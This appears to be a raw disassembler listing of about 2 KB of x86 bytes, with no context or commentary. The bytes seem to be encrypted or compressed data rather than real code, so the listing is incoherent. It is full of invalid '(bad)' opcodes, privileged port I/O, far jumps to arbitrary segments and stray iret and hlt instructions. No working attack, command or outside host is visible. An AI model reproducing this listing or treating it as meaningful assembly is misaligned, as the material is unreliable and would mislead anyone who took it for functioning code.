  40570e:	fmul   QWORD PTR gs:[eax+0x69]
  405713:	lea    ebp,[edx+ebx*8+0x4f]
  405717:	dec    ecx
  405718:	mov    eax,ds:0xff61307c
  40571d:	fstp   TBYTE PTR [edi]
  40571f:	fild   DWORD PTR [ebp+0x2295e46e]
  405725:	and    al,0x49
  405727:	jg     0x4056d0
  405729:	push   ebx
  40572a:	xor    ebp,ebp
  40572c:	push   cs
  40572d:	xchg   edx,eax
  40572e:	shl    DWORD PTR [esi-0x5880356e],cl
  405734:	push   eax
  405735:	mov    al,ds:0x6ddcab82
  40573a:	dec    esi
  40573b:	(bad)  
  40573d:	dec    ebx
  40573e:	shl    DWORD PTR [ecx+0x1f7aa9e6],0xdf
  405745:	add    eax,0xa090960d
  40574a:	out    0x3a,al
  40574c:	or     eax,0x73c558de
  405751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405752:	imul   esp,DWORD PTR [edi+0x51],0x72
  405756:	cmp    BYTE PTR [ebx],0xf2
  405759:	mov    eax,DWORD PTR [ebp-0x10]
  40575c:	fcmovnu st,st(7)
  40575e:	or     DWORD PTR [esi],ebp
  405760:	or     BYTE PTR [ecx-0x33],cl
  405763:	cs jo  0x405700
  405766:	cmp    al,0x6f
  405768:	jmp    0x6391:0xa494f78
  40576f:	pop    ds
  405770:	xor    dl,BYTE PTR [ebx]
  405772:	stc    
  405773:	das    
  405774:	popa   
  405775:	add    eax,0x1d78f31c
  40577a:	jecxz  0x405764
  40577c:	imul   eax,DWORD PTR [ebx-0x34],0xe4d29425
  405783:	iret   
  405784:	mov    ds:0xe1d4a3a5,al
  405789:	add    al,0x14
  40578b:	rol    DWORD PTR [esi+0x60b577df],1
  405791:	add    DWORD PTR [ebx+ecx*1+0x59],ecx
  405795:	data16 jo 0x40575a
  405798:	lods   al,BYTE PTR ds:[esi]
  405799:	je     0x40571b
  40579b:	data16 js 0x405737
  40579e:	test   DWORD PTR [edx-0x31],esi
  4057a1:	(bad)
  4057a6:	inc    ecx
  4057a7:	inc    ecx
  4057a8:	ins    DWORD PTR es:[edi],dx
  4057a9:	arpl   WORD PTR [edi-0x62],ax
  4057ac:	dec    ebp
  4057ad:	cmp    al,0x97
  4057af:	lea    edx,[ecx]
  4057b1:	in     al,0x1c
  4057b3:	add    esp,DWORD PTR [ebx]
  4057b5:	lds    ebp,FWORD PTR [ebx+0x5f]
  4057b8:	ret    
  4057b9:	loope  0x40576c
  4057bb:	inc    esi
  4057bc:	iret   
  4057bd:	jno    0x405764
  4057bf:	xor    DWORD PTR [ebx+0x2956bedd],edi
  4057c5:	jno    0x405817
  4057c7:	call   0x4e93a2f3
  4057cc:	cmp    eax,0xb5b3f853
  4057d1:	(bad)  
  4057d2:	call   0xa79c4f80
  4057d7:	daa    
  4057d8:	mov    ds:0xc46b8ed5,al
  4057dd:	and    BYTE PTR [ecx+0x5ba0fc05],ah
  4057e3:	retf   
  4057e4:	in     al,dx
  4057e5:	lahf   
  4057e6:	add    ah,dl
  4057e8:	and    eax,0xaded4f25
  4057ed:	sub    al,bl
  4057ef:	scas   al,BYTE PTR es:[edi]
  4057f0:	aam    0xa2
  4057f2:	sbb    esi,DWORD PTR [edi+0x62c48d6f]
  4057f8:	push   edi
  4057f9:	or     al,0x2b
  4057fb:	add    DWORD PTR [ebp-0x606f13d0],ecx
  405801:	mov    ch,0xb9
  405803:	repnz xor eax,0x8d7c0016
  405809:	aaa    
  40580a:	scas   al,BYTE PTR es:[edi]
  40580b:	jbe    0x405840
  40580d:	xchg   esp,eax
  40580e:	shl    bl,0x0
  405811:	mov    ecx,0xe9f4e4ac
  405816:	rcr    BYTE PTR [edi],1
  405818:	cmp    eax,0x7bd53803
  40581d:	pop    ss
  40581e:	out    0x9,al
  405820:	mov    ?,WORD PTR [eax-0x13]
  405823:	inc    ecx
  405824:	jmp    0x4f7b:0x80c9e307
  40582b:	clc    
  40582c:	jb     0x405817
  40582e:	(bad)  
  40582f:	xchg   ecx,eax
  405830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405831:	aam    0x54
  405833:	mov    edi,0xbf975d3b
  405838:	pop    esp
  405839:	xchg   ebp,eax
  40583a:	out    dx,eax
  40583b:	cmp    dh,BYTE PTR [edx-0x6e]
  40583e:	ins    BYTE PTR es:[edi],dx
  40583f:	xchg   ebp,eax
  405840:	int3   
  405841:	sbb    eax,0x72f25e2f
  405846:	imul   ebx,edi,0x6e55b476
  40584c:	lods   al,BYTE PTR ds:[esi]
  40584d:	adc    edi,DWORD PTR [ebp-0x34]
  405850:	push   0x81bb6e2a
  405855:	in     eax,dx
  405856:	iret   
  405857:	mov    es,WORD PTR [esi-0x17]
  40585a:	daa    
  40585b:	mov    BYTE PTR [edi+eiz*4+0x63],bh
  40585f:	mov    esi,0x417285f4
  405864:	cs push 0xac071d56
  40586a:	lahf   
  40586b:	mov    ch,0xb4
  40586d:	pop    ecx
  40586e:	jbe    0x405824
  405870:	cld    
  405871:	xchg   DWORD PTR [edi+0x6],esp
  405874:	hlt    
  405875:	aad    0xa7
  405877:	popa   
  405878:	adc    ebp,eax
  40587a:	rcl    ebp,0x21
  40587d:	sbb    DWORD PTR [esi-0x19],esp
  405880:	mov    ds,WORD PTR [ebp+0x42d2da53]
  405886:	fisubr WORD PTR [ebp-0x72]
  405889:	(bad)  
  40588a:	mov    ah,0xdd
  40588c:	mov    ds:0xe64bbf83,al
  405891:	lahf   
  405892:	pop    ebp
  405893:	imul   esp,DWORD PTR [ebp+0x47e74cf8],0x60
  40589a:	xlat   BYTE PTR ds:[ebx]
  40589b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40589c:	pop    eax
  40589d:	and    eax,0xb6d9dcb8
  4058a2:	and    DWORD PTR [esi],0xfd06faea
  4058a8:	(bad)  
  4058a9:	xchg   esi,eax
  4058aa:	xor    ebx,ebx
  4058ac:	inc    edi
  4058ad:	mov    bh,0x12
  4058af:	retf   0xaa0
  4058b2:	cld    
  4058b3:	mov    bl,0x54
  4058b5:	ins    DWORD PTR es:[edi],dx
  4058b6:	push   ds
  4058b7:	cmp    ah,BYTE PTR [esi]
  4058b9:	mov    ebp,0xc2716f50
  4058be:	mov    dh,0xa0
  4058c0:	mov    al,0x13
  4058c2:	jp     0x405890
  4058c4:	pop    ss
  4058c5:	xor    DWORD PTR [edi-0x7f],ecx
  4058c8:	or     DWORD PTR [ecx+0x4fea766c],edi
  4058ce:	lods   eax,DWORD PTR ds:[esi]
  4058cf:	or     BYTE PTR [eax-0x1d089781],ch
  4058d5:	pop    ds
  4058d6:	imul   ecx,DWORD PTR [eax],0xfb990287
  4058dc:	int3   
  4058dd:	jmp    0xd908:0x224691d1
  4058e4:	dec    ebx
  4058e5:	stos   DWORD PTR es:[edi],eax
  4058e6:	ss loop 0x405919
  4058e9:	pop    es
  4058ea:	cli    
  4058eb:	and    eax,0x61d4c1d0
  4058f0:	add    ebx,0xffffff84
  4058f3:	in     al,0xec
  4058f5:	in     eax,0x57
  4058f7:	pop    ebp
  4058f8:	inc    ebx
  4058f9:	and    bh,BYTE PTR [edi+esi*1-0x72]
  4058fd:	dec    ebp
  4058fe:	dec    ebp
  4058ff:	cli    
  405900:	sub    DWORD PTR [edx-0x218b237e],esp
  405906:	pop    esi
  405907:	ins    DWORD PTR es:[edi],dx
  405908:	push   esp
  405909:	inc    ebx
  40590a:	ret    0xe14e
  40590d:	xor    BYTE PTR ds:0x276c7d11,cl
  405913:	fisttp QWORD PTR [eax]
  405915:	push   ds
  405916:	mov    ds:0xa9a9a359,eax
  40591b:	bound  edx,QWORD PTR [edi-0x3fdebf1e]
  405921:	sbb    DWORD PTR [ebp+edi*2-0x50],ebp
  405925:	xchg   ecx,eax
  405926:	sti    
  405927:	mov    ebp,DWORD PTR ds:0xb9d9b11b
  40592d:	lock push es
  40592f:	lods   eax,DWORD PTR ds:[esi]
  405930:	inc    edx
  405931:	retf   
  405932:	inc    esi
  405933:	jmp    0x40598c
  405935:	in     eax,0x42
  405937:	sub    edx,ebp
  405939:	pop    esp
  40593a:	mov    edi,0x7c6d40b1
  40593f:	pop    edx
  405940:	push   ebp
  405941:	cmp    al,0x84
  405943:	call   0xf3ff3236
  405948:	hlt    
  405949:	push   ecx
  40594a:	inc    edi
  40594b:	lea    ebp,[ecx-0x725157c5]
  405951:	xchg   DWORD PTR [ebx+0x19],esp
  405954:	retf   
  405955:	xor    al,0x8f
  405958:	xor    BYTE PTR [ecx+0x19],al
  40595b:	sub    al,0xe6
  40595d:	rcr    ecx,0x8
  405960:	cmp    ebp,edx
  405962:	xor    bl,cl
  405964:	push   ss
  405965:	and    eax,0x54b3788a
  40596a:	test   DWORD PTR ds:0x1373a6fb,edx
  405970:	ss mov edi,0x5298df4a
  405976:	and    ebx,0x917db49c
  40597c:	pop    ebx
  40597d:	ret    0x222f
  405980:	adc    ch,BYTE PTR [esi-0x5e]
  405983:	movd   mm7,DWORD PTR [edx-0x3a]
  405987:	shr    BYTE PTR [eax+0x774b9040],0x89
  40598e:	jmp    0x405985
  405990:	lods   eax,DWORD PTR ds:[esi]
  405991:	sbb    al,0x2b
  405993:	inc    ecx
  405994:	bound  ebx,QWORD PTR [esi+ebp*1]
  405997:	xor    BYTE PTR [eax+0x313e7613],dh
  40599d:	adc    DWORD PTR [edx],esp
  40599f:	mov    edi,0x727cd905
  4059a4:	mov    dh,bh
  4059a6:	and    al,0xbc
  4059a8:	daa    
  4059a9:	add    al,ah
  4059ab:	lods   eax,DWORD PTR ds:[esi]
  4059ac:	or     eax,DWORD PTR [edi-0x34]
  4059af:	cs xor dh,cl
  4059b2:	adc    ebx,esp
  4059b4:	cmp    DWORD PTR [edx],edx
  4059b6:	adc    ah,BYTE PTR [esi+0x17]
  4059b9:	xor    ah,bl
  4059bb:	mov    dh,0x10
  4059bd:	xchg   ebx,eax
  4059be:	xchg   esi,eax
  4059bf:	mov    bl,0x32
  4059c1:	ins    DWORD PTR es:[edi],dx
  4059c2:	imul   esp,DWORD PTR [edi],0xffffff83
  4059c5:	xchg   edx,eax
  4059c6:	test   al,0x6
  4059c8:	stos   DWORD PTR es:[edi],eax
  4059c9:	or     ebx,esi
  4059cb:	neg    BYTE PTR [esi]
  4059cd:	push   esp
  4059ce:	adc    al,0x30
  4059d0:	lods   eax,DWORD PTR ds:[esi]
  4059d1:	and    dh,BYTE PTR [edi]
  4059d3:	mov    dl,0x57
  4059d5:	inc    edi
  4059d6:	cld    
  4059d7:	push   ecx
  4059d8:	inc    esp
  4059d9:	out    dx,eax
  4059da:	or     BYTE PTR [esi+0x21],ah
  4059dd:	jns    0x405992
  4059df:	or     al,0xd2
  4059e1:	call   0x3f21:0x56cbe90
  4059e8:	dec    edx
  4059e9:	or     ebp,DWORD PTR [ebp+0x1]
  4059ec:	inc    esi
  4059ed:	call   0x930:0x14085424
  4059f4:	push   0xbed852bf
  4059f9:	aad    0x74
  4059fb:	xchg   ebp,eax
  4059fc:	and    BYTE PTR [ecx+0x1e],al
  4059ff:	mov    esp,0x8d05beab
  405a04:	imul   ebp,edi,0x27
  405a07:	mov    edi,0x3d47c245
  405a0c:	popa   
  405a0d:	push   esi
  405a0e:	sub    ah,BYTE PTR [eax]
  405a10:	sub    DWORD PTR [edi-0x5445b55d],ebp
  405a16:	sti    
  405a17:	push   esp
  405a18:	push   esi
  405a19:	sahf   
  405a1a:	jmp    0x4059ba
  405a1c:	mov    ah,0x63
  405a1e:	sahf   
  405a1f:	push   esi
  405a20:	dec    ecx
  405a21:	push   eax
  405a22:	dec    esi
  405a23:	cmovno esp,DWORD PTR [ecx+0x3087dd18]
  405a2a:	mov    al,0x23
  405a2c:	popf   
  405a2d:	push   0x3e
  405a2f:	aaa    
  405a30:	ficom  WORD PTR [edi-0x11]
  405a33:	sbb    bl,BYTE PTR [ecx]
  405a35:	inc    ebx
  405a36:	fidiv  DWORD PTR [edx-0x75294cda]
  405a3c:	hlt    
  405a3d:	cmp    bh,ch
  405a3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a40:	mov    ecx,0x1020a155
  405a45:	xchg   esi,eax
  405a46:	ins    DWORD PTR es:[edi],dx
  405a47:	or     ecx,DWORD PTR [ecx*4-0x3dcbe829]
  405a4e:	sar    DWORD PTR [edx+eiz*2+0x12819d81],cl
  405a55:	cmp    BYTE PTR [edi-0xc5c8c7d],bl
  405a5b:	rcr    bl,1
  405a5d:	iret   
  405a5e:	sbb    al,0x40
  405a60:	shl    DWORD PTR [eax-0x1cf233],0xa3
  405a67:	neg    BYTE PTR [ebp+eax*2+0x71fee27f]
  405a6e:	imul   eax,DWORD PTR [ebp-0x1e],0xda367ce4
  405a75:	push   ds
  405a76:	push   ecx
  405a77:	sahf   
  405a78:	or     BYTE PTR [ebx+0x19],0x2e
  405a7c:	pop    ds
  405a7d:	add    esi,0x1d
  405a80:	fldcw  WORD PTR [ebx+0x38]
  405a83:	inc    ebp
  405a84:	xlat   BYTE PTR ds:[ebx]
  405a85:	pusha  
  405a86:	cmp    bh,BYTE PTR [esi+0x2cba75c5]
  405a8c:	dec    eax
  405a8d:	inc    ebx
  405a8e:	jp     0x405a26
  405a90:	and    BYTE PTR [eax-0x7b1ee55e],ah
  405a96:	dec    esi
  405a97:	sbb    ch,bl
  405a99:	sbb    DWORD PTR [eax-0x22],ebp
  405a9c:	std    
  405a9d:	retf   0xcd63
  405aa0:	int    0x14
  405aa2:	sbb    DWORD PTR [ebx-0x4b8d9826],ebp
  405aa8:	in     al,dx
  405aa9:	loopne 0x405aec
  405aab:	in     eax,dx
  405aac:	mov    esp,0x9aa33be3
  405ab1:	lahf   
  405ab2:	add    ebp,eax
  405ab4:	mov    cl,0xb1
  405ab6:	imul   ecx
  405ab8:	pop    es
  405ab9:	adc    ch,dl
  405abb:	in     al,dx
  405abc:	daa    
  405abd:	cwde   
  405abe:	cmc    
  405abf:	push   0x62
  405ac1:	arpl   WORD PTR [esi],si
  405ac3:	add    al,0xd8
  405ac5:	push   0x6cc3b7a4
  405aca:	pop    ds
  405acb:	out    dx,eax
  405acc:	jnp    0x405a7a
  405ace:	fld    DWORD PTR ds:[eax]
  405ad1:	dec    edx
  405ad2:	sub    al,0x65
  405ad4:	push   ebp
  405ad5:	jecxz  0x405ab8
  405ad7:	in     eax,dx
  405ad8:	mov    ds:0x1f7b0395,al
  405add:	inc    ebx
  405ade:	repnz pop edi
  405ae0:	jp     0x405ade
  405ae2:	jnp    0x405afd
  405ae4:	xchg   ebp,eax
  405ae5:	inc    edi
  405ae6:	sbb    esi,esp
  405ae8:	cdq    
  405ae9:	pop    edx
  405aea:	xlat   BYTE PTR ds:[ebx]
  405aeb:	push   eax
  405aec:	and    DWORD PTR [eax-0x7483bb24],0x6
  405af3:	cmp    al,0xe1
  405af5:	arpl   WORD PTR [esi],ax
  405af7:	inc    ebp
  405af8:	ins    DWORD PTR es:[edi],dx
  405af9:	adc    BYTE PTR [ebp+0x1b833d21],bh
  405aff:	sub    eax,DWORD PTR [edi+ecx*2-0x549dd3b5]
  405b06:	xor    BYTE PTR [eax],bh
  405b08:	dec    ebx
  405b09:	es stc 
  405b0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b0c:	lds    esp,FWORD PTR [esp+ebp*1+0x4623e3d8]
  405b13:	mov    ds:0x51039fa3,eax
  405b18:	push   ebp
  405b19:	push   esp
  405b1a:	inc    edx
  405b1b:	jmp    0xb89a:0x5f3be81
  405b22:	pop    ebp
  405b23:	add    esi,DWORD PTR [ecx+0x5d]
  405b26:	and    eax,0x3bf595df
  405b2b:	mov    cl,0x92
  405b2d:	ins    BYTE PTR es:[edi],dx
  405b2e:	rcr    DWORD PTR [ebp-0x250465fa],0xc6
  405b35:	or     esi,DWORD PTR [edi]
  405b37:	mov    al,ds:0x25681b3d
  405b3c:	cli    
  405b3d:	je     0x405b4e
  405b3f:	les    esi,FWORD PTR [esi-0x7b3b93a0]
  405b45:	sar    DWORD PTR [ebx+edx*8+0x11],cl
  405b49:	mov    ds:0xddf0add2,eax
  405b4e:	lock and BYTE PTR [esi+eiz*2+0x42dab589],bl
  405b56:	mov    ds:0x894284be,al
  405b5b:	mov    fs,WORD PTR [edi-0x24]
  405b5e:	and    dl,BYTE PTR [esi-0x44]
  405b61:	xchg   ebp,eax
  405b62:	jbe    0x405ba2
  405b64:	push   ebp
  405b65:	dec    esp
  405b66:	not    DWORD PTR [ebx]
  405b68:	bound  esp,QWORD PTR [ecx+0x58]
  405b6b:	rcr    esi,0xeb
  405b6e:	pop    es
  405b6f:	mov    dl,0x1d
  405b71:	xchg   ebp,eax
  405b72:	aaa    
  405b73:	in     al,0x1e
  405b75:	mov    edx,0x6f6803d9
  405b7a:	add    eax,0x4b56d3dd
  405b7f:	gs or  eax,0x54814ef8
  405b85:	jbe    0x405b26
  405b87:	enter  0xd816,0xaf
  405b8b:	sbb    al,0x9e
  405b8d:	jae    0x405bb5
  405b8f:	mov    bl,0xf6
  405b91:	fs cs xchg esi,eax
  405b94:	fiadd  DWORD PTR [ebx+ecx*1]
  405b97:	loopne 0x405b96
  405b99:	aaa    
  405b9a:	pop    esp
  405b9b:	or     al,0xf1
  405b9d:	cwde   
  405b9e:	jg     0x405bcd
  405ba0:	mov    edx,0xe6b32d2f
  405ba5:	add    BYTE PTR [ebx],bh
  405ba7:	aaa    
  405ba8:	outs   dx,BYTE PTR ds:[esi]
  405ba9:	push   ecx
  405baa:	mov    DWORD PTR [ebx+0x57ec0699],eax
  405bb0:	call   0xb5c7f876
  405bb5:	retf   0xc880
  405bb8:	loop   0x405bd2
  405bba:	mov    ecx,0x18341de2
  405bbf:	ja     0x405b71
  405bc1:	inc    edi
  405bc2:	sub    esi,esp
  405bc4:	sbb    BYTE PTR [ecx+0x1d7736f0],ah
  405bca:	sbb    BYTE PTR ss:0xfa56bdd6,al
  405bd1:	nop
  405bd2:	jnp    0x405bb4
  405bd4:	jne    0x405bc8
  405bd6:	mov    dl,0x2c
  405bd8:	pop    ds
  405bd9:	ret    
  405bda:	xor    BYTE PTR [eax],0xf4
  405bdd:	sbb    eax,0xca7dbdc5
  405be2:	not    DWORD PTR [ecx+eax*4-0x7b]
  405be6:	mov    cl,0x24
  405be8:	test   eax,0x5a5a1655
  405bed:	(bad)
  405bf0:	loopne 0x405bbd
  405bf2:	jnp    0x405c06
  405bf4:	mov    al,ds:0x1d5d52ce
  405bf9:	retf   
  405bfa:	mov    ch,0xdf
  405bfc:	lds    ebx,FWORD PTR [edx]
  405bfe:	das    
  405bff:	mov    edi,0xac586287
  405c04:	popf   
  405c05:	leave  
  405c06:	ins    DWORD PTR es:[edi],dx
  405c07:	adc    BYTE PTR [eax-0x38],bl
  405c0a:	and    al,0x4
  405c0c:	mov    ebx,0xf2d82774
  405c11:	ins    BYTE PTR es:[edi],dx
  405c12:	mov    eax,0x92d5e64d
  405c17:	jo     0x405bb7
  405c19:	push   edx
  405c1a:	sbb    al,0xfc
  405c1c:	cdq    
  405c1d:	mov    ebx,0xfb8d10ca
  405c22:	push   eax
  405c23:	dec    ebx
  405c24:	gs cmc 
  405c26:	(bad)  
  405c28:	cli    
  405c29:	loopne 0x405c59
  405c2b:	xlat   BYTE PTR ds:[ebx]
  405c2c:	jno    0x405c13
  405c2e:	fist   WORD PTR [ecx]
  405c30:	push   es
  405c31:	mov    ecx,0x3091b1e7
  405c36:	ins    DWORD PTR es:[edi],dx
  405c37:	mov    ah,0x3e
  405c39:	int    0xad
  405c3b:	xor    DWORD PTR [edi-0x2ebe927b],esp
  405c41:	xchg   esi,eax
  405c42:	popa   
  405c43:	mov    ah,0x49
  405c45:	imul   ecx,DWORD PTR [ebp-0x58],0xd3d2ad3b
  405c4c:	or     BYTE PTR [eax+ebx*2],dl
  405c4f:	lods   al,BYTE PTR ds:[esi]
  405c50:	fldenv [ebx+0x4c]
  405c53:	outs   dx,DWORD PTR ds:[esi]
  405c54:	fldl2t 
  405c56:	push   0x68fc95a4
  405c5b:	and    ecx,ebx
  405c5d:	push   esp
  405c5e:	out    dx,eax
  405c5f:	repnz adc DWORD PTR [edx],esp
  405c62:	stos   DWORD PTR es:[edi],eax
  405c63:	xlat   BYTE PTR ds:[ebx]
  405c64:	pop    ecx
  405c65:	loope  0x405bfe
  405c67:	or     DWORD PTR [esi],edi
  405c69:	or     DWORD PTR [eax],esi
  405c6b:	dec    edi
  405c6c:	test   esi,edx
  405c6e:	xor    esi,DWORD PTR [esi]
  405c70:	outs   dx,DWORD PTR ds:[esi]
  405c71:	and    bl,BYTE PTR [eax-0x4c334ec6]
  405c77:	inc    ebp
  405c78:	shl    DWORD PTR [eax],0x12
  405c7b:	out    dx,eax
  405c7c:	shl    DWORD PTR [edi+0xfe2fd02],cl
  405c82:	mov    ds:0xf4e682d7,eax
  405c87:	popa   
  405c88:	in     al,0xa5
  405c8a:	inc    edi
  405c8b:	sbb    edi,DWORD PTR [ebx+eiz*4]
  405c8e:	mov    edi,0x8fca3cf4
  405c93:	mov    ah,BYTE PTR [esi+0x4d7ba6fc]
  405c99:	cmp    al,0xd0
  405c9b:	ins    BYTE PTR es:[edi],dx
  405c9c:	repz in al,dx
  405c9e:	mov    ds:0xac7ae794,al
  405ca3:	cmp    DWORD PTR [edx],edx
  405ca5:	inc    esi
  405ca6:	mov    al,0x60
  405ca8:	mov    al,0xeb
  405caa:	je     0x405c97
  405cac:	test   bh,cl
  405cae:	retf   0x434e
  405cb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cb2:	loopne 0x405d0d
  405cb4:	jbe    0x405caa
  405cb6:	popa   
  405cb7:	arpl   si,di
  405cb9:	js     0x405c81
  405cbb:	ret    0x9bac
  405cbe:	inc    esi
  405cbf:	fisttp WORD PTR [edx+0x4cf94ef2]
  405cc5:	jmp    0x2599:0x438b4e7e
  405ccc:	daa    
  405ccd:	sar    al,0xc4
  405cd0:	daa    
  405cd1:	push   0xf
  405cd3:	aas    
  405cd4:	sub    dh,dl
  405cd6:	inc    edi
  405cd7:	leave  
  405cd8:	cs mov dl,0xc
  405cdb:	jns    0x405c8f
  405cdd:	xchg   edx,eax
  405cde:	retf   
  405cdf:	out    dx,al
  405ce0:	into   
  405ce1:	push   esp
  405ce2:	push   edx
  405ce3:	jb     0x405d2c
  405ce5:	in     al,0x17
  405ce7:	iret   
  405ce8:	adc    eax,ebp
  405cea:	cwde   
  405ceb:	enter  0xd6a7,0x82
  405cef:	cld    
  405cf0:	push   0xfffffff1
  405cf2:	xlat   BYTE PTR ds:[ebx]
  405cf3:	pop    esi
  405cf4:	lods   eax,DWORD PTR ds:[esi]
  405cf5:	push   0x5d1af216
  405cfa:	push   ebp
  405cfb:	test   bh,ah
  405cfd:	adc    BYTE PTR es:[esi],cl
  405d00:	pop    edx
  405d01:	pop    esi
  405d02:	int    0xa8
  405d04:	in     eax,dx
  405d05:	std    
  405d06:	sub    BYTE PTR [esi+edx*2],dl
  405d09:	xchg   DWORD PTR [esi-0x1272e4f],ebx
  405d0f:	in     eax,0xdf
  405d11:	rcl    DWORD PTR [ecx+edi*1],cl
  405d14:	stos   BYTE PTR es:[edi],al
  405d15:	inc    esi
  405d16:	adc    eax,0x85d18c17
  405d1b:	jmp    0x405d3c
  405d1d:	lods   al,BYTE PTR ds:[esi]
  405d1e:	std    
  405d1f:	bound  esi,QWORD PTR cs:[ecx]
  405d22:	leave  
  405d23:	push   0xd5965afb
  405d28:	stos   BYTE PTR es:[edi],al
  405d29:	inc    BYTE PTR [eax+0x68]
  405d2c:	ja     0x405cf8
  405d2e:	lock sub BYTE PTR [eax-0x62],dl
  405d32:	or     al,0x52
  405d34:	add    dh,BYTE PTR [edi+0x1a]
  405d37:	mov    bh,0x25
  405d39:	xor    al,0xa6
  405d3b:	jno    0x405cea
  405d3d:	jno    0x405d51
  405d3f:	adc    eax,0x757207c2
  405d44:	gs cmp ecx,edx
  405d47:	lock mov BYTE PTR [ebx+0x12],ch
  405d4b:	sbb    bh,BYTE PTR [eax]
  405d4d:	mov    ds:0x79ebe2ed,al
  405d52:	cmp    al,al
  405d54:	js     0x405d59
  405d56:	mov    esp,DWORD PTR ds:0xcd5a47ea
  405d5c:	push   ebp
  405d5d:	ror    BYTE PTR ds:0xf932bc1a,1
  405d63:	repz or ebx,ebp
  405d66:	mov    bh,0xf8
  405d68:	push   esp
  405d69:	pop    ebx
  405d6a:	adc    eax,0x28ff9e44
  405d6f:	or     al,0x50
  405d71:	lock or bh,BYTE PTR [ebx-0xa]
  405d75:	xchg   edx,eax
  405d76:	gs mov edi,0x6df6bcad
  405d7c:	mov    dl,0x1f
  405d7e:	pushf  
  405d7f:	sub    ebp,DWORD PTR [ecx+0xf1c9389]
  405d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d86:	sbb    BYTE PTR [ebx+0x4e],cl
  405d89:	inc    edi
  405d8a:	outs   dx,DWORD PTR ds:[esi]
  405d8b:	mov    ecx,esp
  405d8d:	jecxz  0x405dd4
  405d8f:	xchg   ebx,eax
  405d90:	xor    al,0x64
  405d92:	mov    bl,0x41
  405d94:	mov    ah,0xac
  405d96:	push   esi
  405d97:	test   bh,cl
  405d99:	inc    esp
  405d9a:	sub    ebp,edx
  405d9c:	mov    ah,cl
  405d9e:	pop    es
  405d9f:	xor    eax,0xe381d890
  405da4:	fld    TBYTE PTR [eax+0x28]
  405da7:	inc    ebx
  405da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405da9:	aam    0xda
  405dab:	rol    DWORD PTR [esp+edi*2],0x72
  405daf:	inc    esp
  405db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405db1:	lea    eax,ds:0xeb4b86ca
  405db7:	xor    al,0xcc
  405db9:	pop    ebp
  405dba:	xchg   BYTE PTR [edx-0x29],bl
  405dbd:	loop   0x405df4
  405dbf:	sbb    BYTE PTR [edi+0x6a],cl
  405dc2:	dec    esi
  405dc3:	jecxz  0x405da5
  405dc5:	xchg   ebx,eax
  405dc6:	cld    
  405dc7:	push   ebp
  405dc8:	adc    DWORD PTR [ebx+eiz*4+0x16],0xffffffab
  405dcd:	cmc    
  405dce:	daa    
  405dcf:	(bad)  
  405dd0:	das    
  405dd1:	add    DWORD PTR [ebx+0x31],ecx
  405dd4:	sub    eax,0x81ff4c25
  405dd9:	fs cwde 
  405ddb:	std    
  405ddc:	xor    BYTE PTR [esi+edi*4+0x3a54b1d],ah
  405de3:	or     ch,BYTE PTR [esi+0x10]
  405de6:	retf   
  405de7:	dec    ebx
  405de8:	sub    eax,0xde2f752a
  405ded:	sub    ah,BYTE PTR [ebx]
  405def:	xchg   esp,eax
  405df0:	inc    eax
  405df1:	test   DWORD PTR [esi+0x2127122a],ecx
  405df7:	jle    0x405e5e
  405df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dfa:	aam    0x61
  405dfc:	pop    edx
  405dfd:	xchg   ecx,eax
  405dfe:	aaa    
  405dff:	dec    eax
  405e00:	mov    ebx,0x89ca90d
  405e05:	imul   WORD PTR [edi-0x64bab1a4]
  405e0c:	mov    edx,0x76132a9a
  405e11:	rol    BYTE PTR [ecx-0x40e85c3f],cl
  405e17:	sbb    DWORD PTR [ebp+0x27],0x57
  405e1b:	and    al,0xa0
  405e1d:	out    0xd9,al
  405e1f:	addr16 in eax,0x16
  405e22:	popa   
  405e23:	leave  
  405e24:	nop
  405e25:	ret    0x60ec
  405e28:	push   ss
  405e29:	or     al,0x6c
  405e2b:	int3   
  405e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e2d:	lock and dl,BYTE PTR ds:0x77b4377c
  405e34:	jg     0x405e1f
  405e36:	pusha  
  405e37:	test   al,0x39
  405e39:	mov    bl,0x53
  405e3b:	adc    ch,ch
  405e3d:	retf   
  405e3e:	inc    ebx
  405e3f:	sar    DWORD PTR [esi],0xed
  405e42:	(bad)  
  405e43:	popa   
  405e44:	xor    DWORD PTR [esi],ebp
  405e46:	nop
  405e47:	jle    0x405e9f
  405e49:	es jnp 0x405e37
  405e4c:	test   BYTE PTR [ecx+edi*1-0x6100cdf1],ah
  405e53:	retf   
  405e54:	push   edi
  405e55:	loope  0x405e30
  405e57:	mov    esi,0x8b7120ac
  405e5c:	nop
  405e5d:	jp     0x405e6e
  405e5f:	dec    edx
  405e60:	jno    0x405e6d
  405e62:	lods   al,BYTE PTR ds:[esi]
  405e63:	out    0xe1,eax
  405e65:	scas   al,BYTE PTR es:[edi]
  405e66:	xor    cl,al
  405e68:	into   
  405e69:	pop    ecx
  405e6a:	ss cs jae 0x405e58
  405e6e:	add    eax,DWORD PTR [ecx-0x2c]
  405e71:	or     BYTE PTR [esi+0x3b],dh
  405e74:	push   ebx
  405e75:	mov    gs,ebx
  405e77:	jge    0x405e0f
  405e79:	dec    esp
  405e7a:	dec    ebp
  405e7b:	and    eax,0x9e91c795
  405e80:	outs   dx,BYTE PTR ds:[esi]
  405e81:	rol    BYTE PTR [edi-0x4701b8b8],cl
  405e87:	mov    edx,0x74f615e5
  405e8c:	jg     0x405e2f
  405e8e:	or     BYTE PTR [ebp-0x6a],bl
  405e91:	nop
  405e92:	sub    DWORD PTR [esi],0x69
  405e95:	aas    
  405e96:	adc    dl,dh
  405e98:	pop    edx
  405e99:	jmp    0x405ed4
  405e9b:	fnclex 
  405e9d:	sub    DWORD PTR [esi-0x7d],0x6c
  405ea1:	mov    WORD PTR [ebx-0x1ee41a29],ds
  405ea7:	fwait
  405ea8:	sub    eax,0x35bfdc24
  405ead:	lea    edx,[ebx]
  405eaf:	adc    BYTE PTR [edi-0xf],dl
  405eb2:	mov    bl,0x4
